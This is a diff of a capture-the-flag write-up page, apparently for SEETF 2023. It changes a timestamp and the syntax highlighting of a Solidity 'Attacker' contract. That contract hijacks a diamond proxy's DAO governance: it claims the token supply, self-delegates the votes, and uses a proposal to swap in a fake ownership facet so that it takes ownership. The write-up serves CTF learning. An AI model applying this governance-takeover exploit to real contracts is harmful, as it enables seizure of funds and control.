@@ -9,7 +9,7 @@
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://chovid99.github.io/posts/seetf-2023/" /><meta property="og:image" content="https://chovid99.github.io/C99-web-card.png"/><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2023-06-12T09:00:01+07:00" />
-<meta property="article:modified_time" content="2023-06-12T09:00:01+07:00" /><meta property="og:site_name" content="Welcome to Chovid99&#39;s Blog" />
+<meta property="article:modified_time" content="2023-06-12T10:47:18+07:00" /><meta property="og:site_name" content="Welcome to Chovid99&#39;s Blog" />
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://chovid99.github.io/C99-web-card.png"/>
 
@@ -30,7 +30,7 @@
             "@type": "WebPage",
             "@id": "https:\/\/chovid99.github.io\/posts\/seetf-2023\/"
         },"image": ["https:\/\/chovid99.github.io\/C99-web-card.png"],"genre": "posts","keywords": "Writeup, SEETF, smart-contract, reentrancy, diamond, facet, 2023","wordcount":  10012 ,
-        "url": "https:\/\/chovid99.github.io\/posts\/seetf-2023\/","datePublished": "2023-06-12T09:00:01+07:00","dateModified": "2023-06-12T09:00:01+07:00","publisher": {
+        "url": "https:\/\/chovid99.github.io\/posts\/seetf-2023\/","datePublished": "2023-06-12T09:00:01+07:00","dateModified": "2023-06-12T10:47:18+07:00","publisher": {
             "@type": "Organization",
             "name": "Chovid99","logo": "https:\/\/chovid99.github.io\/C99-Black3.png"},"author": {
                 "@type": "Person",
@@ -3800,88 +3800,88 @@
 </span><span class="lnt">82
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">// SPDX-License-Identifier: UNLICENSED
-</span></span><span class="line"><span class="cl">pragma solidity ^0.8.17;
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: UNLICENSED
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">17</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">import {IDiamondCut} from &#34;./interfaces/IDiamondCut.sol&#34;;
-</span></span><span class="line"><span class="cl">import {IDiamondLoupe} from &#34;./interfaces/IDiamondLoupe.sol&#34;;
-</span></span><span class="line"><span class="cl">import {IOwnershipFacet} from &#34;./interfaces/IOwnershipFacet.sol&#34;;
-</span></span><span class="line"><span class="cl">import {IERC20} from &#34;./interfaces/IERC20.sol&#34;;
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">IDiamondCut</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./interfaces/IDiamondCut.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">IDiamondLoupe</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./interfaces/IDiamondLoupe.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">IOwnershipFacet</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./interfaces/IOwnershipFacet.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">IERC20</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./interfaces/IERC20.sol&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">import {DiamondCutFacet} from &#34;./facets/DiamondCutFacet.sol&#34;;
-</span></span><span class="line"><span class="cl">import {OwnershipFacet} from &#34;./facets/OwnershipFacet.sol&#34;;
-</span></span><span class="line"><span class="cl">import {DiamondLoupeFacet} from &#34;./facets/DiamondLoupeFacet.sol&#34;;
-</span></span><span class="line"><span class="cl">import {FeatherCoinFacet} from &#34;./facets/FTCFacet.sol&#34;;
-</span></span><span class="line"><span class="cl">import {DAOFacet} from &#34;./facets/DAOFacet.sol&#34;;
-</span></span><span class="line"><span class="cl">import {PigeonVaultFacet} from &#34;./facets/PigeonVaultFacet.sol&#34;;
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">DiamondCutFacet</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./facets/DiamondCutFacet.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">OwnershipFacet</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./facets/OwnershipFacet.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">DiamondLoupeFacet</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./facets/DiamondLoupeFacet.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">FeatherCoinFacet</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./facets/FTCFacet.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">DAOFacet</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./facets/DAOFacet.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">PigeonVaultFacet</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./facets/PigeonVaultFacet.sol&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">import {PigeonDiamond} from &#34;./PigeonDiamond.sol&#34;;
-</span></span><span class="line"><span class="cl">import {InitDiamond} from &#34;./InitDiamond.sol&#34;;
-</span></span><span class="line"><span class="cl">import {IERC173} from &#34;./interfaces/IERC173.sol&#34;;
-</span></span><span class="line"><span class="cl">import {LibDiamond} from &#34;./libraries/LibDiamond.sol&#34;;
-</span></span><span class="line"><span class="cl">import &#34;./Setup.sol&#34;;
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">PigeonDiamond</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./PigeonDiamond.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">InitDiamond</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./InitDiamond.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">IERC173</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./interfaces/IERC173.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">LibDiamond</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./libraries/LibDiamond.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;./Setup.sol&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">contract FakeOwnershipFacet is IERC173 {
-</span></span><span class="line"><span class="cl">    function transferOwnership(address _newOwner) external override {
-</span></span><span class="line"><span class="cl">        LibDiamond.setContractOwner(_newOwner);
-</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">FakeOwnershipFacet</span> <span class="k">is</span> <span class="n">IERC173</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">transferOwnership</span><span class="p">(</span><span class="kt">address</span> <span class="n">_newOwner</span><span class="p">)</span> <span class="k">external</span> <span class="k">override</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">LibDiamond</span><span class="p">.</span><span class="n">setContractOwner</span><span class="p">(</span><span class="n">_newOwner</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    function owner() external view override returns (address owner_) {
-</span></span><span class="line"><span class="cl">        owner_ = LibDiamond.contractOwner();
-</span></span><span class="line"><span class="cl">    }
-</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">owner</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">override</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">address</span> <span class="n">owner_</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">owner_</span> <span class="o">=</span> <span class="n">LibDiamond</span><span class="p">.</span><span class="n">contractOwner</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">contract Attacker {
-</span></span><span class="line"><span class="cl">    address pigeonDiamond;
-</span></span><span class="line"><span class="cl">    FakeOwnershipFacet fakeOwnershipFacet;
-</span></span><span class="line"><span class="cl">    DAOFacet dao;
-</span></span><span class="line"><span class="cl">    FeatherCoinFacet ftc;
-</span></span><span class="line"><span class="cl">    Setup setup;
-</span></span><span class="line"><span class="cl">    uint256 proposalId;
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Attacker</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="n">pigeonDiamond</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">FakeOwnershipFacet</span> <span class="n">fakeOwnershipFacet</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">DAOFacet</span> <span class="n">dao</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">FeatherCoinFacet</span> <span class="n">ftc</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Setup</span> <span class="n">setup</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="n">proposalId</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    constructor(address _pigeonDiamond, address _setup) {
-</span></span><span class="line"><span class="cl">        pigeonDiamond = _pigeonDiamond;
-</span></span><span class="line"><span class="cl">        ftc = FeatherCoinFacet(pigeonDiamond);
-</span></span><span class="line"><span class="cl">        dao = DAOFacet(pigeonDiamond); 
-</span></span><span class="line"><span class="cl">        fakeOwnershipFacet = new FakeOwnershipFacet();
-</span></span><span class="line"><span class="cl">        setup = Setup(_setup);
+</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_pigeonDiamond</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_setup</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pigeonDiamond</span> <span class="o">=</span> <span class="n">_pigeonDiamond</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ftc</span> <span class="o">=</span> <span class="n">FeatherCoinFacet</span><span class="p">(</span><span class="n">pigeonDiamond</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">dao</span> <span class="o">=</span> <span class="n">DAOFacet</span><span class="p">(</span><span class="n">pigeonDiamond</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">        <span class="n">fakeOwnershipFacet</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FakeOwnershipFacet</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">setup</span> <span class="o">=</span> <span class="n">Setup</span><span class="p">(</span><span class="n">_setup</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        // Claim all FTC
-</span></span><span class="line"><span class="cl">        for (uint i=0; i&lt;100; i++) {
-</span></span><span class="line"><span class="cl">            setup.claim();
-</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">        <span class="c1">// Claim all FTC
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">for</span> <span class="p">(</span><span class="kt">uint</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">100</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">setup</span><span class="p">.</span><span class="n">claim</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        require(ftc.balanceOf(address(this)) == 1_000_000 ether , &#34;Not 1mio FTC&#34;);
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">ftc</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">))</span> <span class="o">==</span> <span class="mi">1</span><span class="n">_000_000</span> <span class="kc">ether</span> <span class="p">,</span> <span class="s">&#34;Not 1mio FTC&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        ftc.delegate(address(this));
-</span></span><span class="line"><span class="cl">        require(ftc.getCurrentVotes(address(this)) == 1_000_000 ether, &#34;Not 1mio votes&#34;);
+</span></span><span class="line"><span class="cl">        <span class="n">ftc</span><span class="p">.</span><span class="n">delegate</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">ftc</span><span class="p">.</span><span class="n">getCurrentVotes</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">))</span> <span class="o">==</span> <span class="mi">1</span><span class="n">_000_000</span> <span class="kc">ether</span><span class="p">,</span> <span class="s">&#34;Not 1mio votes&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        // Setup FakeOwnershipFacet
-</span></span><span class="line"><span class="cl">        bytes4[] memory ownershipFacetSelectors = new bytes4[](2);
-</span></span><span class="line"><span class="cl">        ownershipFacetSelectors[0] = bytes4(hex&#34;8da5cb5b&#34;);
-</span></span><span class="line"><span class="cl">        ownershipFacetSelectors[1] = bytes4(hex&#34;f2fde38b&#34;);
+</span></span><span class="line"><span class="cl">        <span class="c1">// Setup FakeOwnershipFacet
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">bytes4</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">ownershipFacetSelectors</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">bytes4</span><span class="p">[](</span><span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ownershipFacetSelectors</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="kt">bytes4</span><span class="p">(</span><span class="s">hex&#34;8da5cb5b&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ownershipFacetSelectors</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="kt">bytes4</span><span class="p">(</span><span class="s">hex&#34;f2fde38b&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        IDiamondCut.FacetCut memory facetDetails = IDiamondCut.FacetCut({
-</span></span><span class="line"><span class="cl">            facetAddress: address(fakeOwnershipFacet),
-</span></span><span class="line"><span class="cl">            action: IDiamondCut.FacetCutAction.Replace,
-</span></span><span class="line"><span class="cl">            functionSelectors: ownershipFacetSelectors
-</span></span><span class="line"><span class="cl">        });
-</span></span><span class="line"><span class="cl">        bytes memory callData = abi.encodeCall(
-</span></span><span class="line"><span class="cl">            fakeOwnershipFacet.transferOwnership,
-</span></span><span class="line"><span class="cl">            (msg.sender)
-</span></span><span class="line"><span class="cl">        );
-</span></span><span class="line"><span class="cl">        proposalId = dao.submitProposal(address(fakeOwnershipFacet), callData, facetDetails);
-</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">        <span class="n">IDiamondCut</span><span class="p">.</span><span class="n">FacetCut</span> <span class="k">memory</span> <span class="n">facetDetails</span> <span class="o">=</span> <span class="n">IDiamondCut</span><span class="p">.</span><span class="n">FacetCut</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">            <span class="n">facetAddress</span><span class="o">:</span> <span class="kt">address</span><span class="p">(</span><span class="n">fakeOwnershipFacet</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="n">action</span><span class="o">:</span> <span class="n">IDiamondCut</span><span class="p">.</span><span class="n">FacetCutAction</span><span class="p">.</span><span class="n">Replace</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">functionSelectors</span><span class="o">:</span> <span class="n">ownershipFacetSelectors</span>
+</span></span><span class="line"><span class="cl">        <span class="p">});</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">callData</span> <span class="o">=</span> <span class="nb">abi</span><span class="p">.</span><span class="n">encodeCall</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">fakeOwnershipFacet</span><span class="p">.</span><span class="n">transferOwnership</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">proposalId</span> <span class="o">=</span> <span class="n">dao</span><span class="p">.</span><span class="n">submitProposal</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">fakeOwnershipFacet</span><span class="p">),</span> <span class="n">callData</span><span class="p">,</span> <span class="n">facetDetails</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    function castVote(bytes memory _sig) public {
-</span></span><span class="line"><span class="cl">        dao.castVoteBySig(proposalId, true, _sig);
-</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">castVote</span><span class="p">(</span><span class="kt">bytes</span> <span class="k">memory</span> <span class="n">_sig</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">dao</span><span class="p">.</span><span class="n">castVoteBySig</span><span class="p">(</span><span class="n">proposalId</span><span class="p">,</span> <span class="kc">true</span><span class="p">,</span> <span class="n">_sig</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    function execute() public {
-</span></span><span class="line"><span class="cl">        dao.executeProposal(proposalId);
-</span></span><span class="line"><span class="cl">        require(IOwnershipFacet(pigeonDiamond).owner() == msg.sender, &#34;Pigeon Diamond&#39;s owner isn&#39;t msg.sender&#34;);
-</span></span><span class="line"><span class="cl">    }
-</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">execute</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">dao</span><span class="p">.</span><span class="n">executeProposal</span><span class="p">(</span><span class="n">proposalId</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">IOwnershipFacet</span><span class="p">(</span><span class="n">pigeonDiamond</span><span class="p">).</span><span class="n">owner</span><span class="p">()</span> <span class="o">==</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="s">&#34;Pigeon Diamond&#39;s owner isn&#39;t msg.sender&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p><strong>Solver</strong></p>
